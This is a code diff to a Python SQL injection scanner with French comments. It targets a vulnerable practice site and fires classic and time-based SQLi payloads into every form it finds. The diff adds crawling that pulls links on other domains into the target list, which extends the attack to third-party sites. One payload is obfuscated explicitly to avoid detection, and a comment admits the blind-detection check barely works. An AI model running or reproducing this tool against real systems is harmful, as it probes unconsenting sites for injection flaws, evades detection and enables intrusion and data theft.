@@ -1,9 +1,10 @@
 import requests
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
+from urllib.parse import urljoin, urlparse
 import time
 
-TARGET_URLS = ["http://testphp.vulnweb.com"]
+TARGET_URL = "http://testphp.vulnweb.com"  # URL cible
+TARGET_URLS = []
 
 # Payloads SQLi classiques et time-based
 SQLI_PAYLOADS = [
@@ -16,11 +17,30 @@ SQLI_PAYLOADS = [
     "' OR CONCAT('SLE','EP(5)')--"  # Séparer SLEEP pour éviter la détection
 ]
 
+def get_external_links(url):
+    """🔗 Récupère tous les liens externes et PHP d'une page"""
+    response = requests.get(url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    base_domain = urlparse(url).netloc
+    external_links = set()
+
+    for link in soup.find_all("a", href=True):
+        href = link["href"]
+        full_url = urljoin(url, href)
+        parsed_url = urlparse(full_url)
+
+        # Inclure les liens PHP même s'ils sont relatifs
+        if parsed_url.path.endswith(".php") or (parsed_url.netloc and parsed_url.netloc != base_domain):
+            external_links.add(full_url)
+
+    return external_links
+
+
 def find_forms(url):
     r = requests.get(url)
     soup = BeautifulSoup(r.text, 'html.parser')
     forms = soup.find_all('form')
-    print(f"[+] Trouvé {len(forms)} formulaire(s) sur {url}")
     return forms
 
 def get_form_details(forms):
@@ -31,6 +51,24 @@ def get_form_details(forms):
             details["inputs"].append({"name": input_tag.get("name"), "type": input_tag.get("type", "text")})
         form_details.append(details)
     return form_details
+
+def get_unique_forms(forms):
+    unique_forms = set()
+    filtered_forms = []
+
+    for form in forms:
+        form_signature = (
+            form.get("action"), 
+            form.get("method", "get").lower(), 
+            tuple((input_tag.get("name"), input_tag.get("type", "text")) for input_tag in form.find_all("input"))
+        )
+
+        if form_signature not in unique_forms:
+            unique_forms.add(form_signature)
+            filtered_forms.append(form)
+    
+    return filtered_forms
+
 
 def test_sqli(url, form_details):
     print(f"\n[🔍] Test d'injection SQL sur : {url}")
@@ -57,20 +95,31 @@ def test_sqli(url, form_details):
         if any(error in response.text for error in error_signatures):
             print(f"[🔥] Injection SQL détectée avec payload : {payload}")
 
-        # Détection Time-Based Blind SQLi
+        # Détection Time-Based Blind SQLi ----> pas vrmt fonctionnel
         if "SLEEP(5)" in payload and elapsed_time > 4:
             print(f"[⏳] Injection SQL Blind détectée avec payload : {payload} (temps : {elapsed_time:.2f}s)")
 
 def lancer_attaque_sqli():
     for url in TARGET_URLS:
-        forms = find_forms(url)
+        forms = get_unique_forms(find_forms(url))
         if not forms:
             print(f"[-] Aucun formulaire trouvé sur {url}")
             continue
+        else : print(f"[+] Trouvé {len(forms)} formulaire(s) sur {url}")
 
         form_details_list = get_form_details(forms)
         for form_details in form_details_list:
             test_sqli(url, form_details)
 
 
+external_links = get_external_links(TARGET_URL)
+
+if external_links:
+    print("\n[🔗] Liens externes trouvés :")
+    for link in external_links:
+        print(f"  ➡️ {link}")
+else:
+    print("[❌] Aucun lien externe trouvé. Vérifie que la page en contient !")
+
+TARGET_URLS.extend(external_links)
 lancer_attaque_sqli()
